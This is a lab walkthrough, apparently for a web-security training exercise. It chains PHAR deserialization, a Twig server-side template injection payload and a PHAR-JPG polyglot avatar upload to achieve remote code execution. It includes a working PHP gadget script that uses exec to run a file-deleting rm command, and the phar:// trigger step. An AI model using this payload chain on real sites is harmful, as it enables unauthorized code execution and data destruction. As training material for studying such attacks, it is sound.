# Using PHAR deserialization to deploy a custom gadget chain
* This lab not explicitly use deserialization. However, if you combine PHAR deserialization with other advanced hacking techniques, you can still achieve remote code execution iva a custom gadget chain.
	* To solve the lab, delete the `morale.txt` file from Carlos's home directory.
	* You can log in to your own account using the following credentials `wiener:peter`

### 1. Enumerate the website as "wiener"
* From `/my-account`, a file upload functionality `/my-account/avatar` is found

![40](https://user-images.githubusercontent.com/53956303/155231199-b064b820-df5f-4833-893e-8f9a1696e2d0.png)
* From the page source the location where the images are stored is found
	* `/cgi-bin/avatar.php?avatar=wiener`

![41](https://user-images.githubusercontent.com/53956303/155231488-c7def1a5-066b-44a4-ac58-ebd099307d38.png)

### 2. Enumerate `/cgi-bin`
* From the `/cgi-bin` directory, some php files are found

![42](https://user-images.githubusercontent.com/53956303/155231867-24515195-175d-4b62-9090-0d5b41255c49.png)
### 3. Enumerate "Blog.php"
* In order to obtain the source code, access to `Blog.php~`

![43](https://user-images.githubusercontent.com/53956303/155232072-c3111ba9-89a9-4ac2-8bbd-03780e780fe2.png)
### 4. Enumeratge "CustomTemplate.php"
* In order to obtain the source code, access to `CustomTemplate.php~`

![44](https://user-images.githubusercontent.com/53956303/155232353-5d30a9ec-f88d-4410-9c03-5a864fd6de04.png)
* Notice that gadget chain involving the `Blog->desc` and `CustomTemplate0->lockFilePath` attributes.
	* Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
* Also from the "Blog.php", the fact that this website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload.
### 5. Write a PHP script that creating a `CustomTemplate` and `Blog` containing the SSTI payload
* This payload is a RCE for  Twig template, and modify this to delete the target file.
```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```
### 6. Create PHAR-JPG polyglot conting the malicious PHP script
* Use the [Phar-jpg-ployglot generator by kunte0](https://github.com/kunte0/phar-jpg-polyglot)
	* Modify the script with the malicious script to delete the target file (/home/carlos/morale.txt)
```bash
sudo vim /opt/phar-jgp-ployglot/phar-jpg-ployglot.jpg
```
![45](https://user-images.githubusercontent.com/53956303/155237651-e58de8f4-2253-4458-971b-8257182fae10.png)
* The output file will be the "out.jpg" in the same directory (the payload will be overwritten)
	* Use `strings` to see if the payload is injected well

![46](https://user-images.githubusercontent.com/53956303/155237782-6179f3c0-e9c5-4602-8568-4d155eb97494.png)
* it is succesfully injected.

### 7. Upload the PHAR-JPG polyglot to tge website and deserialize the file to be executed
* Upload it as an avatar 

![46.5](https://user-images.githubusercontent.com/53956303/155238167-6c5a20b5-fe97-4697-a1b8-ff9394cf56f2.png)
* Then, modify the request to deserialize the malicious payload using `phar://` stream.

![47](https://user-images.githubusercontent.com/53956303/155238047-019b53f7-01df-4238-9ecb-f5693304210b.png)
* As a result, the target file is deleted and the lab is solved.

![48](https://user-images.githubusercontent.com/53956303/155238195-6cc2b64b-9c19-431f-b22d-4eca1fd6ca97.png)
